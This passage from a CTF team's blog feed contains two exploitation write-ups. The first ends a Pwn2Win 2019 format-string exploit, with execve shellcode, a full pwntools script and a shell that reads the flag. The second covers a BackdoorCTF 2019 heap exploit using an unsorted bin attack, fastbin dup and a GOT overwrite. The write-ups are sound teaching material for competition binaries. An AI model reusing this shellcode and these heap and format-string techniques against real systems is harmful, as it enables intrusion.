0)</span><br><span class="line">add rdx, 0x10 ; ads 0x10 to $rdx register which contains the address where we initially jumped</span><br><span class="line">jmp rdx ; jumps to Index 2 shellcode</span><br></pre></td></tr></table></figure><p>Finally we exchange <strong>R11</strong> with <strong>RDX</strong>(size of bytes we want to read) and <strong>R11</strong> with <strong>RSI</strong> (buffer we want to write), luckily <strong>RAX</strong> is already 0 which is the number of <strong>read</strong> sycall on linux at x64 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xchg r11,rdx ; initial value of $r11 is 0x241 so we want this on rdx register </span><br><span class="line">xchg r11,rsi ; old value of $rdx is now at r11 this address is also the address right at the rip instruction</span><br><span class="line">syscall ; read($rdi, $rsi, rdx) with $rax == 0</span><br></pre></td></tr></table></figure><p>The code to this store this shellcode:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'4. Quit\n\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">': '</span>, str(<span class="number">0xe2ff10c28348ff31</span>)) <span class="comment"># xor edi, edi ; add rdx, 0x10 ; jmp rdx </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, str(<span class="number">0x050ff38749d38749</span>)) <span class="comment"># xchg r11,rdx ; xchg r11,rsi ; syscall</span></span><br></pre></td></tr></table></figure><p>Finally we can read from the <strong>STDIN</strong> the shellcode that will get us a shell:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov rbx, 0xFF978CD091969DD1</span><br><span class="line">neg rbx</span><br><span class="line">push rbx</span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">xor esi, esi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 0x3b  ; sys_execve</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>Sending data from the stdin:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rip = p64(<span class="number">0x050ff38749d38749</span>) <span class="comment"># needs to be the code at #rip otherwise we get a segfault</span></span><br><span class="line">shellcode = <span class="string">'\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'</span></span><br><span class="line">r.sendline(rip+shellcode)</span><br></pre></td></tr></table></figure><p>The full exploit code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from libc import time,time_t</span></span><br><span class="line"></span><br><span class="line">host, port = <span class="string">"200.136.252.34"</span>, <span class="string">"1245"</span></span><br><span class="line">filename = <span class="string">"./random_vault"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0xffff</span>:</span><br><span class="line">            script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script += <span class="string">"b *0x%x\n"</span>%(x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">indices_with_seed_zero</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line">    libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">    libc.srand(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">        v0 = libc.rand()</span><br><span class="line">        q = ((v0 &gt;&gt; <span class="number">0x38</span>) + v0) &amp; <span class="number">0xff</span> - ((v0 &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x18</span>)</span><br><span class="line">        <span class="keyword">print</span> q*<span class="number">8</span>   </span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"></span><br><span class="line">r = getConn()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Username: '</span>,<span class="string">'%7$lx|%11$lx'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Hello, '</span>)</span><br><span class="line">STACK = int(r.recvuntil(<span class="string">'|'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">PIE = int(r.recvline().rstrip(),<span class="number">16</span>) - <span class="number">0x1750</span></span><br><span class="line">SEED = PIE+<span class="number">0x5008</span></span><br><span class="line">QWORD5000 = PIE+<span class="number">0x5000</span></span><br><span class="line">unk_5010 = PIE+<span class="number">0x5010</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"LEAKED STACK 0x%x"</span> % STACK)</span><br><span class="line">log.info(<span class="string">"LEAKED PIE 0x%x"</span> % PIE)</span><br><span class="line">log.info(<span class="string">"LEAKED SEED 0x%x"</span> % SEED)</span><br><span class="line">log.info(<span class="string">"LEAKED QWORD5000 0x%x"</span> % QWORD5000)</span><br><span class="line">log.info(<span class="string">"LEAKED unk_5010 0x%x"</span> % unk_5010)</span><br><span class="line">r.sendlineafter(<span class="string">'4. Quit\n\n'</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">shellcode = <span class="string">'\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line">LOW_QWORD4020 = unk_5010 &amp; <span class="number">0xf000</span> | <span class="number">0x348</span></span><br><span class="line">payload = <span class="string">'%29$ln'</span> <span class="comment"># Clear SEED</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%30$hn'</span>.format(LOW_QWORD4020)</span><br><span class="line"></span><br><span class="line">s = payload</span><br><span class="line">s += <span class="string">' '</span>*(<span class="number">40</span>-len(payload))</span><br><span class="line">s += p64(SEED)</span><br><span class="line">s += p64(QWORD5000)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Username: '</span>, s)</span><br><span class="line"><span class="comment">#r.recvuntil('\x20\x20\x32')</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">    debug([<span class="number">0x16B5</span>,<span class="number">0x1474</span>,<span class="number">0x161F</span>]) <span class="comment"># 0x16B5,0x1474,15AC</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'4. Quit\n\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">': '</span>, str(<span class="number">0xe2ff10c28348ff31</span>)) <span class="comment"># xor edi, edi ; add rdx, 0x10 ; jmp rdx </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, str(<span class="number">0x050ff38749d38749</span>)) <span class="comment"># xchg r11,rdx ; xchg r11,rsi ; syscall</span></span><br><span class="line"></span><br><span class="line">r.sendline(p64(<span class="number">0x050ff38749d38749</span>)+shellcode)</span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python random_vault.py REMOTE</span><br><span class="line">[+] Opening connection to 200.136.252.34 on port 1245: Done</span><br><span class="line">[*] LEAKED STACK 0x7ffeb091b470</span><br><span class="line">[*] LEAKED PIE 0x55661a762000</span><br><span class="line">[*] LEAKED SEED 0x55661a767008</span><br><span class="line">[*] LEAKED QWORD5000 0x55661a767000</span><br><span class="line">[*] LEAKED unk_5010 0x55661a767010</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">You<span class="string">'ve stored the following secrets:</span></span><br><span class="line"><span class="string">#1: 16356810799245229873, #2: 364777857225033545, #3: 364777857225033545, #4: 364777857225033545, #5: 364777857225033545, #6: 364777857225033545, #7: 364777857225033545</span></span><br><span class="line"><span class="string">$ cat home/chall/flag</span></span><br><span class="line"><span class="string">CTF-BR&#123;_r4nd0m_1nd1c3s_m4ke_th3_ch4ll3nge_m0r3_fun_&#125;</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Random Vault&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;em&gt;303 points&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;/p
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"/>
    
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="pwn2win2019" scheme="https://teamrocketist.github.io/tags/pwn2win2019/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] BackdoorCtf 2019 - Baby Heap</title>
    <link href="https://teamrocketist.github.io/2019/10/27/Pwn-BackdoorCtf-2019-Baby-Heap/"/>
    <id>https://teamrocketist.github.io/2019/10/27/Pwn-BackdoorCtf-2019-Baby-Heap/</id>
    <published>2019-10-27T19:10:02.000Z</published>
    <updated>2019-10-27T19:24:38.820Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Baby Heap</p><p>pwn backdoorctf19</p><p>Just another babyheap challenge.</p><p><a href="http://backdoor.static.beast.sdslabs.co/static/babyheap/babyheap" target="_blank" rel="noopener">http://backdoor.static.beast.sdslabs.co/static/babyheap/babyheap</a></p><p><a href="http://backdoor.static.beast.sdslabs.co/static/babyheap/libc.so.6" target="_blank" rel="noopener">http://backdoor.static.beast.sdslabs.co/static/babyheap/libc.so.6</a></p><p>nc 51.158.118.84 17001</p><p>Flag format: CTF{…}</p><p>Created by: Nipun Gupta</p></blockquote><p>Another heap challenge the binary had the following attributes:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file babyheap</span><br><span class="line">babyheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=203fc5be05469491a57e7873624c72ef731ed850, stripped</span><br></pre></td></tr></table></figure><p>Checking the security:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec babyheap</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/babyheap/babyheap'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><strong>Partial RELRO</strong> which means we can actually write at global offset table this simplifies things a bit and also <strong>PIE</strong> is not enabled so we can access this addresses very easily without a leak.</p><p>The libc version is:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc.so.6 | grep <span class="string">'libc-'</span></span><br><span class="line">libc-2.23.so</span><br></pre></td></tr></table></figure></p><h3 id="Exploit-plan"><a href="#Exploit-plan" class="headerlink" title="Exploit plan"></a>Exploit plan</h3><p>So for those who want a very fast solution this my exploit plan:</p><ul><li>Use unsorted bin attack to overwrite the value <strong>global_max_fast</strong> by doing a 4 bit brute force.</li><li>Create a fake chunk(0x31) where the saved sizes of malloc are saved (global variables). </li><li>Use fastbin dup to malloc at the created fake chunk and overwrite a string pointer to <strong>atoi</strong> got.</li><li>By using edit we can get an arbitrary write at <strong>atoi</strong> got, we want to change it to <strong>printf</strong> so we can leak libc.</li><li>The program is not broken because <strong>printf</strong> returns the number of the <strong>printed</strong> bytes string so we still using the options to edit <strong>atoi got</strong> to <strong>system</strong>.</li><li>Send ‘/bin/sh\x00’ to read and get a shell.</li></ul><h3 id="Binary-analysis"><a href="#Binary-analysis" class="headerlink" title="Binary analysis"></a>Binary analysis</h3><p>The first thing we can see right at the beginning is <code>mallopt(1,0);</code><br><a data-fancybox="gallery" href="https://i.imgur.com/4cO9ROj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4cO9ROj.png" alt><br></a><br>From linux man pages:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The mallopt() function adjusts parameters that control the behaviour of the memory-allocation functions (see malloc(3)). </span><br><span class="line">The param argument specifies the parameter to be modified, and value specifies the new value for that parameter.</span><br></pre></td></tr></table></figure><p>The parameter being modified is 1 from the symbols also from linux man pages:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*Symbol            param #   default    allowed param values</span><br><span class="line">  M_MXFAST          1         64         0-80  (0 disables fastbins)</span><br><span class="line">  M_TRIM_THRESHOLD -1         128*1024   any   (-1U disables trimming)</span><br><span class="line">  M_TOP_PAD        -2         0          any  </span><br><span class="line">  M_MMAP_THRESHOLD -3         128*1024   any   (or 0 if no MMAP support)</span><br><span class="line">  M_MMAP_MAX       -4         65536      any   (0 disables use of mmap)</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></p><p>We know that <strong>1</strong> is <strong>M_MXFAST</strong> when 0 means fastbins become disabled… </p><p>Continuing our analysis we need to look for vulnerabilities, delete function has a <strong>double free</strong> vulnerability, there is a check at the beginning, but it’s only checking if this index was previously allocated, also another thing to note is that we are limited to 8 free’s, <strong>freeLimit_602088</strong> is initialized to 8.<br><a data-fancybox="gallery" href="https://i.imgur.com/8uteRiO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/8uteRiO.png" alt><br></a></p><p>Another vulnerability can be found at edit, as in delete function there’s no check, so we have a <strong>UAF</strong> vulnerability here:<br><a data-fancybox="gallery" href="https://i.imgur.com/CGx6Fkl.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/CGx6Fkl.png" alt><br></a><br>There’s another limitation to program there’s only 11 slots where the data is saved so we can only use 11 mallocs on our exploit.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="Modifying-global-max-fast"><a href="#Modifying-global-max-fast" class="headerlink" title="Modifying global_max_fast"></a>Modifying global_max_fast</h4><p>There isn’t a print function so there’s no simple way to leak libc and also we can’t use fastbins because they were disabled, our first approach is to find a way re-enable fastbins.</p><p>This can be done if we find a way to modify <strong>global_max_fast</strong> into a big value, but how do we achieve this, we don’t even have libc to calculate the offset to <strong>global_max_fast</strong> ?</p><p>Well one thing we can is a 4 bit bruteforce, if we free a chunk into an <strong>unsortedbin</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/WYoVoaj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/WYoVoaj.png" alt><br></a><br>That’s how we can find the address of <strong>global_max_fast</strong>, and why this variable in particular ? Because it controls the max size that malloc interprets a chunk as fastbin, and it’s current value is <strong>10</strong> because of <strong>mallopt</strong>. </p><p>We need to find a way to modify this value into a bigger number, we can do this by using an <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c" target="_blank" rel="noopener">unsorted bin attack</a>, we need to modify the <strong>bk</strong> to the <strong>address</strong> we want to modify <strong>minus 0x10</strong>.</p><p>This is how the exploit looks right now</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = getConn()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        debug([<span class="number">0x400a5b</span>,<span class="number">0x400bcc</span>]) <span class="comment"># 0x400970</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Unsorted bin attack</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'A'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">'B'</span>*<span class="number">0x80</span>) <span class="comment"># Chunk to free</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">'c'</span>*<span class="number">0x10</span>) <span class="comment">#</span></span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0x31</span>,<span class="string">'d'</span>*<span class="number">0x10</span>) <span class="comment"># CREATE A FAKE CHUNK HERE</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0x0</span>)+p16(<span class="number">0x67f8</span><span class="number">-0x10</span>)) <span class="comment"># 4 bit brute force</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">3</span>,<span class="number">0x80</span>,<span class="string">'C'</span>) <span class="comment"># if we don't get an error here and global_max_fast will be modified.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    r.interactive()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>If we are successful we will modify <strong>global_max_fast</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/6ZOCBQa.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/6ZOCBQa.png" alt><br></a></p><h4 id="Arbitrary-write-using-fastbin-dup"><a href="#Arbitrary-write-using-fastbin-dup" class="headerlink" title="Arbitrary write using fastbin dup"></a>Arbitrary write using fastbin dup</h4><p>We can use fastbin dup now but still we don’t have any leaks, luckily we know that size of each data is being saved at <strong>0x6020e0</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/edIfL6W.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/edIfL6W.png" alt><br></a><br>The data pointers to the strings are also saved in a global variable at <strong>ptr(0x602120)</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/KSZqabj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KSZqabj.png" alt><br></a></p><p>This how it looks in memory in gdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/Ny6Zp0m.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Ny6Zp0m.png" alt><br></a><br>I created a fake chunk at index 8 with malloc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x31</span>,<span class="string">'c'</span>*<span class="number">0x10</span>) <span class="comment"># CREATE A FAKE CHUNK HERE</span></span><br></pre></td></tr></table></figure><p>Now we proceed to use <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">fastbin dup</a> to modify the <strong>fastbin linked list</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup</span></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6020f8</span>)) <span class="comment"># fake chunk</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'C'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(elf.got[<span class="string">'atoi'</span>]))</span><br><span class="line">edit(<span class="number">0</span>, p64(elf.plt[<span class="string">'printf'</span>]))</span><br></pre></td></tr></table></figure><p>We edited the index 0 string pointer into <strong>atoi</strong> got, later with this we can modify atoi got into printf gaining a format string vulnerability to leak libc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'%7$s    '</span></span><br><span class="line">s += p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,s)</span><br><span class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = PUTS-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure><p>Finaly after getting <strong>system</strong> we change again <strong>atoi</strong> to system and send the <strong>/bin/sh</strong> string:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,<span class="string">"AA"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the index:\n"</span>, <span class="string">''</span>)</span><br><span class="line">r.sendafter(<span class="string">"Please update the data:\n"</span>, p64(SYSTEM))</span><br><span class="line">r.send(<span class="string">'/bin/sh\x00'</span>)</span><br></pre></td></tr></table></figure><p>The shell is achieved after this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ python babyheap.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/babyheap/babyheap'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/babyheap/libc-2.23.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 51.158.118.84 on port 17001: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to 51.158.118.84 port 17001</span><br><span class="line">[+] Opening connection to 51.158.118.84 on port 17001: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">.... Truncated......</span><br><span class="line">[+] Opening connection to 51.158.118.84 on port 17001: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to 51.158.118.84 port 17001</span><br><span class="line">[+] Opening connection to 51.158.118.84 on port 17001: Done</span><br><span class="line">[*] LIBC 0x7ffaa87a0000</span><br><span class="line">[*] SYSTEM 0x7ffaa87e5390</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">update successful</span><br><span class="line"></span><br><span class="line">1) Add data</span><br><span class="line">2) Edit data</span><br><span class="line">3) Remove data</span><br><span class="line">4) Exit</span><br><span class="line">&gt;&gt; $ 